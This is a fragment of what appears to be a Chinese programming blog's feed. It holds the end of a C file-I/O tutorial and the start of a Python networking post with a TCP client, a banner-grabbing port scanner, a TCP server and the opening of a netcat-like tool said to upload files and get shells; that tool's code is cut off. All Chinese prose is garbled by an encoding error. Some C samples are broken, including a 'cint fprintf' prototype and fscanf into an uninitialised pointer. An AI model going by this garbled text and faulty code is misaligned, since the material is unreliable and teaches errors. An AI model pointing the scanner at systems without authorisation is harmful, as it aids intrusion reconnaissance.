å…³é—­æ–‡ä»¶</h2><p>æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åé¡ºä¾¿ä¹¦å†™å…³é—­æ–‡ä»¶çš„ä»£ç æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚å…³é—­æ–‡ä»¶çš„å‡½æ•°ä¸º<code>fclose()</code>ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fclose</span><span class="params">( FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆåŠŸå…³é—­æ–‡ä»¶ï¼Œ<strong>fclose( )</strong>å‡½æ•°è¿”å›é›¶ï¼Œå¦‚æœå…³é—­æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼Œå‡½æ•°è¿”å›<strong>EOF</strong>ã€‚</p><p>PSï¼š<strong>EOF</strong>(end of file) ä¸ºæ–‡ä»¶ç»“æŸç¬¦ï¼Œåœ¨Cè¯­è¨€ä¸­å…¶å€¼é€šå¸¸ä¸º<code>-1</code>(å…·ä½“å€¼è¿˜è¦çœ‹ç¼–è¯‘å™¨</p><p>ç»†å¿ƒçš„åŒå­¦å¯èƒ½æ³¨æ„åˆ°äº†ï¼Œä¹‹å‰çš„ä¾‹å­æ²¡æœ‰å…³é—­æ–‡ä»¶ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ç»™å®ƒåŠ ä¸Šå»ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¡Œé¢ç”Ÿæˆ test.txt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"C:\\Users\\your_name\\Desktop\\test.txt"</span>, <span class="string">"w"</span>);  <span class="comment">// æ³¨æ„æ”¹ä¸ºè‡ªå·±ç”µè„‘è·¯å¾„</span></span><br><span class="line">    <span class="comment">// æ–‡ä»¶è¯»å†™æ“ä½œ</span></span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨äº†è§£äº†æ‰“å¼€å’Œå…³é—­æ–‡ä»¶ä¹‹åï¼Œæˆ‘ä»¬æ–‡ä»¶è¯»å†™å¤§è‡´çš„æ¡†æ¶å·²ç»æœ‰äº†ï¼Œæ¥ä¸‹æ¥åªéœ€è¦å­¦ä¹ åœ¨æ‰“å¼€æ–‡ä»¶å’Œå…³é—­æ–‡ä»¶ä¹‹é—´çš„äº‹æƒ…ï¼šå†™å…¥æ–‡ä»¶å’Œè¯»å–æ–‡ä»¶ã€‚</p><p>æ–¹ä¾¿èµ·è§ï¼Œä¹‹åçš„ä¾‹å­å°±ä¸å†æŠŠä»£ç å®Œæ•´å†™ä¸€éäº†ã€‚</p><h2 id="0x02-å†™å…¥æ–‡ä»¶"><a href="#0x02-å†™å…¥æ–‡ä»¶" class="headerlink" title="0x02 å†™å…¥æ–‡ä»¶"></a>0x02 å†™å…¥æ–‡ä»¶</h2><p><code>fputc()</code>å‡½æ•°å¯ä»¥å‘æ–‡ä»¶ä¸­å†™å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œå…¶å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fputc</span><span class="params">( <span class="keyword">int</span> c, FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<strong>fp</strong>å°±æ˜¯æ‰“å¼€æ–‡ä»¶ä¹‹åè¿”å›çš„æ–‡ä»¶æŒ‡é’ˆï¼Œ<strong>c</strong>ä¸ºéœ€è¦å†™å…¥å­—ç¬¦çš„asciiå€¼ã€‚</p><h3 id="fputc-ç”¨æ³•ä¸¾ä¾‹"><a href="#fputc-ç”¨æ³•ä¸¾ä¾‹" class="headerlink" title="fputc() ç”¨æ³•ä¸¾ä¾‹"></a>fputc() ç”¨æ³•ä¸¾ä¾‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†å­—ç¬¦å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">char</span> c = <span class="string">'a'</span>;</span><br><span class="line">FILE *fp = fopen(<span class="string">"C:\\Users\\your_name\\Desktop\\test.txt"</span>, <span class="string">"w"</span>);  <span class="comment">// æ³¨æ„æ”¹ä¸ºè‡ªå·±ç”µè„‘è·¯å¾„</span></span><br><span class="line">fputc(c, fp);</span><br></pre></td></tr></table></figure><p>ä¸€æ¬¡å†™ä¸€ä¸ªå­—ç¬¦ä¼¼ä¹ä¸å¤ªæ–¹ä¾¿ï¼Œè€Œç”¨å¾ªç¯è§£å†³æ„Ÿè§‰ä¸æ˜¯å¾ˆä¼˜é›…ï¼Œ<code>fputs()</code>ç”¨äºå‘æ–‡ä»¶ä¸­å†™å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥è§£å†³æˆ‘ä»¬çš„é—®é¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fputs</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *s, FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p><strong>fp</strong>ä¾æ—§æ˜¯ä½ æ‰“å¼€æ–‡ä»¶çš„æ–‡ä»¶æŒ‡é’ˆï¼Œ<strong>s</strong>ä¸ºéœ€è¦å†™å…¥çš„å­—ç¬¦ä¸²ã€‚</p><h3 id="fputs-ç”¨æ³•ä¸¾ä¾‹"><a href="#fputs-ç”¨æ³•ä¸¾ä¾‹" class="headerlink" title="fputs() ç”¨æ³•ä¸¾ä¾‹"></a>fputs() ç”¨æ³•ä¸¾ä¾‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">char</span> *str = <span class="string">"PHP is the best languages for web programming :)"</span>;</span><br><span class="line">FILE *fp = fopen(<span class="string">"C:\\Users\\your_name\\Desktop\\test.txt"</span>, <span class="string">"w"</span>);  <span class="comment">// æ³¨æ„æ”¹ä¸ºè‡ªå·±ç”µè„‘è·¯å¾„</span></span><br><span class="line"><span class="built_in">fputs</span>(str, fp);</span><br></pre></td></tr></table></figure><p>å¦å¤–è¿˜æœ‰<code>fprint()</code>å‡½æ•°ï¼Œçœ‹ä¸Šå»å’Œ<code>printf()</code>å‡½æ•°å¾ˆåƒï¼Œç¡®å®å¦‚æ­¤ï¼Œå®ƒåªæ¯”<code>printf()</code>å¤šäº†ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆå‚æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">cint <span class="title">fprintf</span> <span class="params">( FILE *fp, <span class="keyword">char</span> * format, ... )</span></span>;</span><br></pre></td></tr></table></figure><p>æŒ‡å®šä½ éœ€è¦å†™å…¥çš„æ–‡ä»¶çš„å¥æŸ„ï¼Œä½ å°±èƒ½åƒä½¿ç”¨<code>printf()</code>å‡½æ•°ä¸€æ ·å‘æ–‡ä»¶é‡Œå†™å…¥å†…å®¹äº†ã€‚</p><h3 id="fprintf-ç”¨æ³•ä¸¾ä¾‹"><a href="#fprintf-ç”¨æ³•ä¸¾ä¾‹" class="headerlink" title="fprintf() ç”¨æ³•ä¸¾ä¾‹"></a>fprintf() ç”¨æ³•ä¸¾ä¾‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ¼å¼åŒ–å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">char</span> *s = <span class="string">"this is a string."</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">FILE *fp = fopen(<span class="string">"C:\\Users\\your_name\\Desktop\\test.txt"</span>, <span class="string">"w"</span>);  <span class="comment">// æ³¨æ„æ”¹ä¸ºè‡ªå·±ç”µè„‘è·¯å¾„</span></span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">"%s %d"</span>, s,i);</span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure><h2 id="0x03-è¯»å–æ–‡ä»¶"><a href="#0x03-è¯»å–æ–‡ä»¶" class="headerlink" title="0x03 è¯»å–æ–‡ä»¶"></a>0x03 è¯»å–æ–‡ä»¶</h2><p>åŒæ ·åœ°ï¼ŒCè¯­è¨€æœ‰è¯»å–ä¸€ä¸ªå­—ç¬¦çš„å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fgetc</span><span class="params">( FILE * fp )</span></span>;</span><br></pre></td></tr></table></figure><p><code>fgetc()</code>å‡½æ•°ä»<strong>fp</strong>æ‰€æŒ‡å‘çš„è¾“å…¥æ–‡ä»¶ä¸­è¯»å–ä¸€ä¸ªå­—ç¬¦ã€‚<strong>è¿”å›å€¼æ˜¯è¯»å–çš„å­—ç¬¦</strong>ï¼Œå¦‚æœå‘ç”Ÿé”™è¯¯åˆ™è¿”å›<strong>EOF</strong>ã€‚</p><h3 id="fgetc-ç”¨æ³•ä¸¾ä¾‹"><a href="#fgetc-ç”¨æ³•ä¸¾ä¾‹" class="headerlink" title="fgetc() ç”¨æ³•ä¸¾ä¾‹"></a>fgetc() ç”¨æ³•ä¸¾ä¾‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¯»å–æ–‡ä»¶å•ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line">FILE *fp = fopen(<span class="string">"filename"</span>, <span class="string">"r"</span>);  <span class="comment">// æ³¨æ„ç›´æ¥å¡«æ–‡ä»¶åæ˜¯ç›¸å¯¹è·¯å¾„</span></span><br><span class="line">ch = fgetc(fp);</span><br></pre></td></tr></table></figure><p>åŒæ ·åœ°ï¼Œä¹Ÿæœ‰è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²çš„å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">fgets</span><span class="params">( <span class="keyword">char</span> *buf, <span class="keyword">int</span> n, FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p><code>fgets()</code>å‡½æ•°ä»<strong>fp</strong>æ‰€æŒ‡å‘çš„è¾“å…¥æµä¸­è¯»å– n - 1 ä¸ªå­—ç¬¦ã€‚å®ƒä¼šæŠŠè¯»å–çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°ç¼“å†²åŒº<strong>buf</strong>ï¼Œå¹¶åœ¨æœ€åè¿½åŠ ä¸€ä¸ª<strong>null</strong>å­—ç¬¦æ¥ç»ˆæ­¢å­—ç¬¦ä¸²ã€‚</p><h3 id="fgets-ç”¨æ³•ä¸¾ä¾‹"><a href="#fgets-ç”¨æ³•ä¸¾ä¾‹" class="headerlink" title="fgets() ç”¨æ³•ä¸¾ä¾‹"></a>fgets() ç”¨æ³•ä¸¾ä¾‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ©ç”¨fgets()å®ç°æŒ‰è¡Œè¯»å–æ–‡æœ¬æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LINE 1024</span></span><br><span class="line"><span class="keyword">char</span> str[MAX_LINE];</span><br><span class="line">FILE *fp = fopen(<span class="string">"filename"</span>, <span class="string">"r"</span>);  <span class="comment">// æ³¨æ„ç›´æ¥å¡«æ–‡ä»¶åæ˜¯ç›¸å¯¹è·¯å¾„</span></span><br><span class="line">fgets(str, MAX_LINE, fp);</span><br></pre></td></tr></table></figure><p>æœ‰<code>fprintf()</code>è‡ªç„¶å°±ä¹Ÿè¿˜æœ‰<code>fscanf()</code>å‡½æ•°ï¼Œå®ƒç”¨äºæ ¼å¼åŒ–è¯»å–æ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fscanf</span> <span class="params">( FILE *fp, <span class="keyword">char</span> * format, ... )</span></span>;</span><br></pre></td></tr></table></figure><p>åŒæ ·å®ƒä¹Ÿåªéœ€è¦æŒ‡å®šæ–‡ä»¶æŒ‡é’ˆï¼Œç„¶åå’Œ<code>scanf()</code>å‡½æ•°æ²¡æœ‰å¤šå¤§å·®åˆ«ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ¼å¼åŒ–è¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> *str;</span><br><span class="line"><span class="built_in">fscanf</span>(fp, <span class="string">"%d %s"</span>, &amp;i, str);</span><br></pre></td></tr></table></figure><h2 id="0x04-å®ä¾‹"><a href="#0x04-å®ä¾‹" class="headerlink" title="0x04 å®ä¾‹"></a>0x04 å®ä¾‹</h2><h3 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h3><p>å°è¯•ç¼–å†™ä¸€ä¸ªç¨‹å¼ï¼Œè¾“å…¥å­¦å·ã€å§“åä»¥åŠç§‘ç›®æˆç»©ä¿å­˜è‡³æ–‡ä»¶ä¸­ï¼Œä¹‹å<strong>æŒ‰è¡Œè¯»å–æ•°æ®å¹¶ä¿å­˜è‡³ç›¸åº”å˜é‡ä¸­</strong>ï¼Œå†è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚</p><h2 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h2><p>ä»¥ä¸Šæ˜¯Cè¯­è¨€ä¸­æ–‡ä»¶æ“ä½œçš„ä¸€äº›åŸºç¡€ç”¨æ³•ï¼Œå½“ç„¶ï¼Œè¿™ç¯‡æ•™ç¨‹åªæ˜¯æŠ›ç –å¼•ç‰ï¼Œè¿˜æœ‰åƒ<code>fwrite()</code>å’Œ<code>fread()</code>çš„å‡½æ•°æ²¡æœ‰ä»‹ç»ï¼Œä¸Šé¢çš„ä¾‹å­ä¹Ÿåªæ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼Œæ–¹æ³•ä¸é™ï¼Œèƒ½å¤Ÿå®ç°åŠŸèƒ½å³å¯ï¼ˆå½“ç„¶ä»£ç è¶Šæ¼‚äº®è¶Šå¥½ï¼Œå› ä¸ºä¹‹åçš„å¤§ä½œä¸šä¹Ÿä¼šé‡åˆ°= =</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¢«è¦æ±‚å†™çš„æ•™ç¨‹ï¼Œç›´æ¥åˆ äº†æ„Ÿè§‰å¯æƒœï¼Œæ¯•ç«Ÿ&lt;del&gt;ç™¾åº¦&lt;/del&gt;å†™äº†é‚£ä¹ˆä¹…ï¼Œå½“ä½œå¤‡å¿˜å½•è¦ç”¨çš„æ—¶å€™çœ‹çœ‹å§ã€‚&lt;/p&gt;
&lt;h2 id=&quot;0x00-
      
    
    </summary>
    
    
    
      <category term="å¤‡å¿˜å½•" scheme="https://www.sketchplane.top/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Pythonè„šæœ¬å­¦ä¹ (ä¸€)</title>
    <link href="https://www.sketchplane.top/2019/07/23/python%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/"/>
    <id>https://www.sketchplane.top/2019/07/23/python%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/</id>
    <published>2019-07-23T03:19:00.000Z</published>
    <updated>2019-07-23T04:44:58.589Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨å­¦ä¹ pythonç½‘ç»œè„šæœ¬ç¼–å†™ï¼Œåˆ©ç”¨tcpå®¢æˆ·ç«¯/æœåŠ¡å™¨å­¦ä¹ ç¼–å†™äº†ä¸€ä¸ªä»£æ›¿netcat(ç®€é™‹)çš„å·¥å…·ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p><h2 id="TCP-å®¢æˆ·ç«¯"><a href="#TCP-å®¢æˆ·ç«¯" class="headerlink" title="TCP å®¢æˆ·ç«¯"></a>TCP å®¢æˆ·ç«¯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®è¿æ¥ipå’Œç«¯å£</span></span><br><span class="line">target_host = <span class="string">"0.0.0.0"</span></span><br><span class="line">target_port = <span class="number">22</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºsocketå¯¹è±¡</span></span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥</span></span><br><span class="line">client.connect((target_host, target_port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€æ¶ˆæ¯</span></span><br><span class="line">client.send(<span class="string">"Hey, I'm TCP client service!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å“åº”å¹¶æ‰“å°</span></span><br><span class="line">response = client.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="keyword">print</span> response</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„TCPå®¢æˆ·ç«¯ï¼Œå‘æŒ‡å®šçš„ipå’Œç«¯å£å‘é€æ•°æ®ï¼Œç„¶åå°†è¿”å›è¾“å‡ºï¼Œç”±è¿™ä¸ªæˆ‘ä»¬å¯ä»¥æ‹“å±•å‡ºä¸€ä¸ªç®€æ˜“çš„ç«¯å£æ‰«æå™¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment"># è®¾ç½®æ‰«æçš„ä¸»æœº</span></span><br><span class="line">hosts = [<span class="string">'127.0.0.1'</span>, <span class="string">'192.168.0.1'</span>, <span class="string">'10.0.0.1'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®å¸¸ç”¨ç«¯å£</span></span><br><span class="line">ports = [<span class="number">22</span>, <span class="number">445</span>, <span class="number">80</span>, <span class="number">443</span>, <span class="number">3389</span>]</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line"><span class="comment"># éå†åˆ—è¡¨ï¼Œè·å–åˆ°æœ‰ç›¸åº”çš„ç«¯å£æ—¶æ‰“å°</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Attempting to connect to "</span> + host + <span class="string">':'</span> + str(port)</span><br><span class="line">            s.connect((host, port))</span><br><span class="line">            s.send(<span class="string">'sketch_pl4ne \n'</span>)</span><br><span class="line">            banner = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> banner:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"Host:"</span> + host + <span class="string">"Port:"</span> + str(port) +<span class="string">" open:"</span> + banner</span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2019/07/23/5d3684d8d1a8c28493.png" alt=""></p><p>æ„Ÿè§‰æœ‰é‚£ä¹ˆç‚¹æ„æ€äº†= =</p><h2 id="TCP-æœåŠ¡å™¨"><a href="#TCP-æœåŠ¡å™¨" class="headerlink" title="TCP æœåŠ¡å™¨"></a>TCP æœåŠ¡å™¨</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># ç”¨äºå¤šçº¿ç¨‹å¤„ç†</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®è¦ç›‘å¬çš„ipå’Œç«¯å£</span></span><br><span class="line">bind_ip = <span class="string">"0.0.0.0"</span></span><br><span class="line">bind_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºsocketå¯¹è±¡</span></span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»‘å®šipå’Œç«¯å£</span></span><br><span class="line">server.bind((bind_ip, bind_port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å§‹ç›‘å¬å¹¶è®¾ç½®æœ€å¤§è¿æ¥æ•°</span></span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Listening on %s:%d"</span> % (bind_ip, bind_port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®¢æˆ·è¿æ¥å¤„ç†çº¿ç¨‹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(client_socket)</span>:</span></span><br><span class="line"></span><br><span class="line">    request = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Received: %s"</span> % request</span><br><span class="line"></span><br><span class="line">    client_socket.send(<span class="string">"ACK!"</span>)</span><br><span class="line"></span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¾ªç¯ç›‘å¬ï¼Œå½“æœ‰å®¢æˆ·ç«¯è¿æ¥å°±è°ƒç”¨ handler_client()å‡½æ•°</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ¥å—å®¢æˆ·ç«¯è¿æ¥ï¼Œè¿”å›(æ–°å¥—æ¥å­—, è¿æ¥å®¢æˆ·ç«¯åœ°å€)çš„ä¸€ä¸ªå…ƒç»„</span></span><br><span class="line">    client, addr = server.accept()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Accepted connection from: %s:%d"</span> % (addr[<span class="number">0</span>], addr[<span class="number">1</span>])  <span class="comment"># addr[0]æ˜¯ip, addr[1]æ˜¯ç«¯å£</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æŒ‚èµ·å®¢æˆ·ç«¯çº¿ç¨‹ï¼Œå¤„ç†ä¼ å…¥çš„æ•°æ®</span></span><br><span class="line">    client_handler = threading.Thread(target=handle_client, args=(client, ))  <span class="comment"># targetä¸ºéœ€è¦è°ƒç”¨çš„å‡½æ•°ï¼Œargsä¸ºå‡½æ•°å¯¹åº”çš„å‚æ•°(å…ƒç»„)</span></span><br><span class="line">    client_handler.start()</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬ä¸»è¦ç”¨æ¥ç›‘å¬ç«¯å£å¹¶ä¸”æ¥æ”¶è¿æ¥ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥ç”¨åˆšåˆšçš„å®¢æˆ·ç«¯ç»™å®ƒå‘æ¶ˆæ¯ï¼š</p><p><img src="https://i.loli.net/2019/07/23/5d3686460f7b766274.png" alt=""></p><h2 id="netdog"><a href="#netdog" class="headerlink" title="netdog"></a>netdog</h2><p>è¿™ä¸ªè„šæœ¬ä½¿ç”¨pythonç¼–å†™æ¥ä»£æ›¿netcat(å¤§å¤šæ•°æƒ…å†µä¸‹æ²¡æœ‰ncä½†æ˜¯æœ‰pythonçš„ç¯å¢ƒä¸­)å®ç°ä¸Šä¼ æ–‡ä»¶ï¼Œè·å–shellï¼Œå‘é€ä¿¡æ¯ç­‰ç­‰åŠŸèƒ½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 